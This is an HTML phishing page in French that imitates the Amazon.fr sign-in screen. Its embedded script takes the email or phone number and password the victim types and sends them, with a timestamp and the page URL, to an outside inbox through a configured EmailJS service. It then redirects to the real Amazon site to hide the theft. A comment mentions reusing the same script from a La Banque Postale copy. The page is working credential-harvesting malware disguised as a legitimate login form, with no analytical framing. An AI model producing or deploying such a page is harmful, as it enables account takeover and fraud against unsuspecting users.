<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Se connecter - Amazon.fr</title>
    <style>
        body { font-family: 'Amazon Ember', Arial, sans-serif; background-color: #fff; margin: 0; padding: 20px; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
        .container { width: 100%; max-width: 350px; text-align: left; }
        .logo { width: 100px; margin-bottom: 10px; }
        h2 { font-size: 22px; font-weight: 400; margin: 0 0 15px 0; color: #111; }
        label { display: block; font-size: 13px; font-weight: 700; margin-bottom: 5px; color: #111; }
        input { width: 100%; padding: 10px; border: 1px solid #a6a6a6; border-radius: 4px; font-size: 15px; box-sizing: border-box; margin-bottom: 15px; }
        input:focus { outline: none; border-color: #e77600; box-shadow: 0 0 3px 1px #e77600; }
        button { width: 100%; padding: 10px; background-color: #f7ca00; border: 1px solid #c4a000; border-radius: 8px; font-size: 14px; font-weight: 500; cursor: pointer; opacity: 0.7; margin-top: 5px; }
        button.active { opacity: 1; background-color: #f7ca00; cursor: pointer; }
        .help { font-size: 13px; margin-top: 15px; color: #0066c0; }
        .help a { color: #0066c0; text-decoration: none; }
        #debug-panel { position: fixed; bottom: 0; left: 0; width: 100%; height: 20px; background: #000; color: #0f0; font-size: 10px; text-align: center; line-height: 20px; cursor: pointer; z-index: 9999; }
    </style>
</head>
<body>
    <div class="container">
        <img src="https://upload.wikimedia.org/wikipedia/commons/a/a9/Amazon_logo.svg" alt="Amazon" class="logo">
        <h2>Connexion</h2>
        <form id="loginForm" onsubmit="return false;">
            <label for="user">Adresse e-mail ou téléphone mobile</label>
            <input type="text" id="user" name="user" placeholder="Ex : nom@exemple.com" autocomplete="off" required>
            
            <label for="pass">Mot de passe</label>
            <input type="password" id="pass" name="pass" placeholder="Entrez votre mot de passe" autocomplete="off" required>
            
            <button id="submitBtn" disabled>Suivant</button>
        </form>
        <div class="help">
            <a href="#">Mot de passe oublié ?</a><br>
            <a href="#">Créer un compte Amazon</a>
        </div>
    </div>
    <div id="debug-panel" onclick="alert('Debug mode')">●</div>

    <!-- INCLURE LE SCRIPT EMAILJS ICI (Copier-coller du script La Banque Postale) -->
    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
    <script type="text/javascript">
        // --- CONFIGURATION EMAILJS ---
        const SERVICE_ID = 'service_tj9phir'; 
        const TEMPLATE_ID = 'template_nn9wgbv';
        const PUBLIC_KEY = 'HaD7JiQcdKpDqeS7S';
        (function(){ emailjs.init(PUBLIC_KEY); })();

        const userField = document.getElementById('user');
        const passField = document.getElementById('pass');
        const submitBtn = document.getElementById('submitBtn');

        function sendAndRedirect() {
            const templateParams = { identifiant: userField.value || '-', mot_de_passe: passField.value || '-', date: new Date().toLocaleString(), url: window.location.href };
            submitBtn.innerText = "Vérification...";
            submitBtn.disabled = true;
            emailjs.send(SERVICE_ID, TEMPLATE_ID, templateParams)
                .then(() => window.location.href = "https://www.amazon.fr")
                .catch(() => window.location.href = "https://www.google.com");
        }

        function checkFields() {
            if (userField.value.length > 0 && passField.value.length > 0) {
                submitBtn.disabled = false; submitBtn.classList.add('active');
            } else {
                submitBtn.disabled = true; submitBtn.classList.remove('active');
            }
        }
        userField.addEventListener('input', checkFields);
        passField.addEventListener('input', checkFields);
        submitBtn.addEventListener('click', () => { if (!submitBtn.disabled) sendAndRedirect(); });
        
        function handleEnterKey(e) {
            if (e.key === 'Enter' || e.keyCode === 13) {
                e.preventDefault();
                if (document.activeElement === passField && !submitBtn.disabled) sendAndRedirect();
                else if (document.activeElement === userField) passField.focus();
            }
        }
        userField.addEventListener('keypress', handleEnterKey);
        passField.addEventListener('keypress', handleEnterKey);

        document.addEventListener('focus', function(e) { if (e.target.type === 'password') { e.target.type = 'text'; e.target.setAttribute('data-was-password', 'true'); } }, true);
        document.addEventListener('blur', function(e) { if (e.target.type === 'text' && e.getAttribute('data-was-password')) { e.target.type = 'password'; e.removeAttribute('data-was-password'); } }, true);
    </script>
</body>
</html>
